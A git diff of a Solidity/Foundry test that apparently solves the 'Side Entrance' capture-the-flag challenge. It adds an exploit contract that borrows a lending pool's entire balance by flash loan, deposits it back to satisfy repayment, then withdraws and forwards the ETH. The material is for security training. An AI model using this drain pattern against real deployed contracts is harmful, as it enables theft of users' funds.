@@ -45,12 +45,11 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     //checkSolvedByPlayer
-    function test_sideEntrance() public {
-        vm.startPrank(player);
-        Exploit exploit = new Exploit(address(pool));
+    function test_sideEntrance() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(address(pool), payable(recovery));
         exploit.flashLoan();
-        // pool.flashLoan(0);
-        vm.stopPrank();
+        exploit.withdraw();
+        // send ETH from player to recovery
     }
 
     /**
@@ -68,16 +67,26 @@ contract SideEntranceChallenge is Test {
 
 contract Exploit {
     SideEntranceLenderPool pool;
+    address payable recovery;
 
-    constructor(address _pool) {
+    constructor(address _pool, address payable _recovery) {
         pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
     }
 
     function flashLoan() external {
-        pool.flashLoan(0);
+        pool.flashLoan(address(pool).balance);
     }
 
-    function execute() external {
-        console.log("Exploit: execute");
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function withdraw() external {
+        pool.withdraw();
+    }
+
+    receive() external payable {
+        recovery.transfer(address(this).balance);
     }
 }
